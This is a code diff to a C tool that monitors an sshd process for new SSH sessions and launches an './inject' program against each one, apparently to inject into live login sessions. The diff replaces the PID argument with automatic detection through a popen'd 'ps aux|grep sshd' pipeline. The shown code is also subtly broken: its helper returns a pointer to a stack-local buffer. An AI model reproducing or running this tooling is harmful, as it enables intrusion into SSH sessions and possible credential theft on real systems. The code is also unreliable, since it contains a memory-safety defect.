@@ -78,7 +78,21 @@ char *vals[3];
 		execve("./inject", vals, NULL);
 	}
 }
-
+char * execshell(const char *command){
+    FILE * fp;
+    char buffer[64];
+    fp=popen(command,"r");
+    fgets(buffer,sizeof(buffer),fp);
+    printf("%s",buffer);
+    pclose(fp);
+    return buffer;
+}
+char * get_sshd_pid(){
+    char * sshd_pid;
+    sshd_pid=execshell("ps aux|grep sshd|awk '{print$2}'|head -n 1");
+    sshd_pid[strlen(sshd_pid)-1]=0;
+    return sshd_pid;
+}
 int main(int argc, char **argv) {
 struct timespec ts;
 
@@ -87,16 +101,19 @@ struct timespec ts;
 
 	memset(pids, 0, sizeof(pids));
 
-	if (argc != 2) {
-		printf("Usage: %s SSHD_PID\n", argv[0]);
-		return 2;
-	}
+	// if (argc != 2) {
+	// 	printf("Usage: %s SSHD_PID\n", argv[0]);
+	// 	return 2;
+	// }
+	char  sshd_pids[64];
+    sprintf(sshd_pids,"%s",get_sshd_pid());
+    printf("find sshd_pids [%s]",sshd_pids);
 
-	printf("[*] Starting monitor for PPID %d\n", atoi(argv[1]));
+	printf("[*] Starting monitor for PPID %d\n", atoi(sshd_pids));
 
 	// Endless loop to monitor sessions
 	while(1) {
 	    nanosleep(&ts, NULL);
-	    monitorForSSH(atoi(argv[1]), &launchInject);
+	    monitorForSSH(atoi(sshd_pids), &launchInject);
 	}
 }
